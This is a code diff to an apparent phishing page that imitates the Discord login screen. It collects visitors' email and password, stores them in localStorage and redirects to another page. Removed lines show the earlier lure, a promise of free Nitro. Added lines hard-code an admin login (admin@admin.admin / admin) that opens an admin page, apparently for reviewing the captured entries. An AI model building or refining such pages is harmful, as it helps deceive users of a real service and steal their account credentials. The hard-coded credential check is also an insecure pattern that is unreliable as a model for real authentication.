@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Discord - LogIn</title>
+    <title>Discord - Log In</title>
     <link rel="icon" type="image/png" href="logo1.png">
     <style>
         body {
@@ -145,6 +145,12 @@
             const email = document.getElementById('email').value;
             const password = document.getElementById('password').value;
 
+            // Check for admin credentials
+            if (email === 'admin@admin.admin' && password === 'admin') {
+                window.location.href = "admin.html";
+                return;
+            }
+
             // Combine email and password into an object
             const user = {
                 email: email,
@@ -160,11 +166,8 @@
             // Save updated user info back to localStorage
             localStorage.setItem('userInfo', JSON.stringify(userInfo));
 
-            // Display success message
-            alert('Successful! The Nitro will be sent to your email (under 24hr).');
-
-            // Clear the form
-            document.getElementById('loginForm').reset();
+            // Redirect to 10.html
+            window.location.href = "10.html";
         });
 
         // Function to redirect to admin page
